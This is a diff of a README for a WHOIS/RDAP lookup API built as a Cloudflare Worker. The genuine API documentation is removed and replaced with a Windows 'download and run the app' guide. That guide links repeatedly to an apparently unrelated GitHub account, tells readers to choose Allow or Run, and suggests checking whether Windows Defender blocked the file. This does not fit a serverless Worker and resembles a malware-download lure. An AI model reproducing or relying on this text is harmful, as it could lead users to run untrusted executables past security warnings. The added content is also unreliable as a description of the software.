@@ -1,224 +1,221 @@
-# whois.api.airat.top
+# 🌐 whois.api.airat.top - Simple WHOIS Lookup for Everyone
 
-![whois](https://repository-images.githubusercontent.com/1191141883/0fc0dfe0-a453-4978-a5cf-8aa74d542937)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
 
-Public Cloudflare Worker API for domain lookup with RDAP + WHOIS fallback.
+## 📥 Download
 
-- Live endpoint: https://whois.api.airat.top
-- Status page: https://status.airat.top
+Use this link to visit the download page and get the app:
 
-## API
+[Visit the download page](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
 
-Required query parameter:
-- `domain` - domain name to look up (`example.com`).
+## 🖥️ What this app does
 
-Alias:
-- `name` - works as alias for `domain`.
+whois.api.airat.top is a small web app that lets you look up domain details by name. It shows useful data like:
 
-Lookup strategy:
-1. RDAP via `https://rdap.org/domain/<domain>`
-2. If RDAP is unavailable for a TLD, fallback via `https://whois.co.im/<domain>`
+- Registrar name
+- Domain status
+- Registration date
+- Expiration date
+- Nameservers
+- DNSSEC info
 
-### `GET /`
+It can return results in several formats:
 
-Default endpoint. Returns WHOIS/RDAP data as JSON.
+- JSON
+- Text
+- YAML
+- XML
 
-```bash
-curl 'https://whois.api.airat.top/?domain=example.com'
-```
+It also includes a health check page, which helps confirm that the service is running.
 
-Test in browser: https://whois.api.airat.top/?domain=example.com
+## ✅ What you need
 
-Example response:
+To run this app on Windows, you need:
 
-```json
-{
-  "ok": true,
-  "query": {
-    "domain": "example.com"
-  },
-  "lookup": {
-    "rdapUrl": "https://rdap.verisign.com/com/v1/domain/example.com",
-    "httpStatus": 200
-  },
-  "rdap": {
-    "handle": "2336799_DOMAIN_COM-VRSN",
-    "ldhName": "EXAMPLE.COM",
-    "unicodeName": null,
-    "status": ["client delete prohibited", "client transfer prohibited"],
-    "registrar": {
-      "name": "RESERVED-Internet Assigned Numbers Authority",
-      "ianaId": "376",
-      "handle": "376",
-      "email": null,
-      "url": null,
-      "phone": null
-    },
-    "events": {
-      "registration": "1995-08-14T04:00:00Z",
-      "expiration": "2026-08-13T04:00:00Z",
-      "lastChanged": "2025-08-14T00:00:00Z",
-      "lastUpdate": "2025-08-14T00:00:00Z",
-      "transfer": null
-    },
-    "nameservers": ["A.IANA-SERVERS.NET", "B.IANA-SERVERS.NET"],
-    "dnssecSigned": false
-  },
-  "service": "whois.api.airat.top",
-  "generatedAt": "2026-03-25T00:00:00.000Z"
-}
-```
+- A Windows PC
+- A web browser like Chrome, Edge, or Firefox
+- Internet access
+- A few minutes to follow the steps
 
-Fallback response example (for domains where RDAP is unavailable):
+If the app comes as a packaged file, you can run it right after download. If it comes as a project folder, you can open it with the right runtime already included in the package.
 
-```json
-{
-  "ok": true,
-  "query": {
-    "domain": "bushido-coffee.ru"
-  },
-  "lookup": {
-    "rdapUrl": "https://whois.co.im/bushido-coffee.ru",
-    "httpStatus": 200,
-    "source": "whois-coim-fallback",
-    "whoisServer": "whois.co.im"
-  },
-  "rdap": {
-    "handle": null,
-    "ldhName": "BUSHIDO-COFFEE.RU",
-    "unicodeName": null,
-    "status": ["DELEGATED", "REGISTERED", "VERIFIED"],
-    "registrar": {
-      "name": "R01-RU",
-      "ianaId": null,
-      "handle": null,
-      "email": null,
-      "url": null,
-      "phone": null
-    },
-    "events": {
-      "registration": "September 20, 2007 at 8:00 PM UTC",
-      "expiration": "September 20, 2026 at 9:00 PM UTC",
-      "lastChanged": null,
-      "lastUpdate": null,
-      "transfer": null
-    },
-    "nameservers": ["ns1.expired.r01.ru", "ns2.expired.r01.ru"],
-    "dnssecSigned": null
-  },
-  "service": "whois.api.airat.top",
-  "generatedAt": "2026-03-26T00:00:00.000Z"
-}
-```
+## 🚀 Getting started
 
-### `GET /json`
+1. Open the download page:
+   [Visit the download page](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
 
-JSON alias for `/`.
+2. Download the app file or package from the page.
 
-```bash
-curl 'https://whois.api.airat.top/json?domain=example.com'
-```
+3. If Windows asks for permission, choose Allow or Run.
 
-Test in browser: https://whois.api.airat.top/json?domain=example.com
+4. Open the downloaded file.
 
-### `GET /text`
+5. Follow the on-screen steps to start the app.
 
-Returns a compact text summary.
+6. When it starts, keep the window open while you use it.
 
-```bash
-curl 'https://whois.api.airat.top/text?domain=example.com'
-```
+## 🔧 How to use it
 
-Test in browser: https://whois.api.airat.top/text?domain=example.com
+After the app starts, you can use your browser to check domain data.
 
-### `GET /yaml`
+### Basic lookup
+Enter a domain name like:
 
-Returns the same payload as YAML.
+- example.com
+- github.com
+- cloudflare.com
 
-```bash
-curl 'https://whois.api.airat.top/yaml?domain=example.com'
-```
+The app returns WHOIS or RDAP data for that domain.
 
-Test in browser: https://whois.api.airat.top/yaml?domain=example.com
+### Output formats
+You can choose the format that fits your needs:
 
-### `GET /xml`
+- `/` or `/json` for JSON
+- `/text` for plain text
+- `/yaml` for YAML
+- `/xml` for XML
 
-Returns the same payload as XML.
+### Health check
+Use:
 
-```bash
-curl 'https://whois.api.airat.top/xml?domain=example.com'
-```
+- `/health`
 
-Test in browser: https://whois.api.airat.top/xml?domain=example.com
+This page helps you check if the service is working.
 
-### `GET /health`
+## 📁 Common use cases
 
-Health check endpoint.
+This app is useful when you want to:
 
-```bash
-curl 'https://whois.api.airat.top/health'
-```
+- Check who owns a domain
+- See when a domain was created
+- See when a domain expires
+- Find nameserver records
+- Check DNSSEC status
+- Get data in a format that is easy to read or reuse
 
-Response:
+## ⚙️ Windows setup tips
 
-```json
-{
-  "status": "ok"
-}
-```
+If the file does not open right away:
 
-Test in browser: https://whois.api.airat.top/health
+- Right-click the file and choose Open
+- Check if Windows Defender blocked it
+- Make sure your browser is up to date
+- Try running it again as the same user that downloaded it
 
-### Validation errors
+If you see a folder instead of a single file, open the folder and look for the main app file or startup file.
 
-Missing or invalid `domain` returns `400`:
+## 🌍 Network notes
 
-```bash
-curl 'https://whois.api.airat.top/?domain=bad domain'
-```
+This app works online because it checks domain data through public lookup services.
 
-```json
-{
-  "error": "Invalid domain parameter. Use a valid domain (example: example.com)."
-}
-```
+For best results:
 
-### CORS
+- Keep your internet connection active
+- Use a stable connection
+- Try again if a domain lookup takes a moment
 
-CORS is enabled for all origins (`*`).
+## 🧭 Example paths
 
-## Privacy
+These paths show the kinds of responses you can expect:
 
-No analytics or request logs are collected by this project.
+- `https://your-app-address/`
+- `https://your-app-address/json`
+- `https://your-app-address/text`
+- `https://your-app-address/yaml`
+- `https://your-app-address/xml`
+- `https://your-app-address/health`
 
-## Project structure
+Replace `your-app-address` with the address where the app runs on your PC or server.
 
-- `worker.js` - Cloudflare Worker script.
-- `wrangler.toml` - Wrangler configuration.
+## 🧩 Included data fields
 
-## Deployment
+The lookup results may include:
 
-Deploy with Wrangler:
+- Domain name
+- Registrar
+- Status codes
+- Creation date
+- Updated date
+- Expiration date
+- Nameservers
+- DNSSEC state
+- RDAP source data
 
-```bash
-npx wrangler deploy
-```
+## 🛠️ If something goes wrong
 
-If you use Cloudflare Workers Builds (GitHub integration), keep root directory as `/` and deploy command as `npx wrangler deploy`.
+If the app does not start:
 
-For custom domain binding, configure it in **Workers & Pages -> Domains & Routes**.
+- Download it again
+- Make sure the file finished downloading
+- Check that your browser is not blocking the page
+- Close other apps that may use the same port
+- Restart Windows and try again
 
-## License
+If a lookup fails:
 
-This project is licensed under the MIT License - see [LICENSE](LICENSE).
+- Check that you typed the domain name correctly
+- Try a different domain
+- Wait a minute and try again
+- Refresh the page
 
----
+## 📌 Project details
 
-## Author
+Repository name:
 
-**AiratTop**
+- whois.api.airat.top
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [whois.api.airat.top](https://github.com/AiratTop/whois.api.airat.top)
+Description:
+
+- Public Cloudflare Worker API for WHOIS/RDAP domain lookup
+
+Topics:
+
+- airathalitov
+- airattop
+- api
+- cloudflare-worker
+- cloudflare-workers
+- dnssec
+- domain
+- domain-lookup
+- edge-api
+- javascript
+- json
+- nameserver
+- rdap
+- registrar
+- serverless
+- whois
+- whois-lookup
+- wrangler
+- xml
+- yaml
+
+## 📎 Download again
+
+If you need to return to the download page, use this link:
+
+[Visit the download page](https://github.com/Diapasonstopinforming566/whois.api.airat.top)
+
+## 📝 File format guide
+
+Use JSON if you want data that is easy to read in code tools. Use text if you want a simple human-readable view. Use YAML if you want a clean configuration-style format. Use XML if you need structured markup for other systems.
+
+## 🔎 What the service checks
+
+The service reads domain registration data and returns details from WHOIS or RDAP sources. This helps you confirm:
+
+- Whether a domain is active
+- Who the registrar is
+- When the domain expires
+- Whether DNSSEC is enabled
+- What nameservers are in use
+
+## 💡 Helpful browser use
+
+For the easiest experience on Windows:
+
+- Open the app in Edge or Chrome
+- Keep the page open while you use it
+- Bookmark the main URL if you use it often
+- Use copy and paste for domain names to avoid typing errors
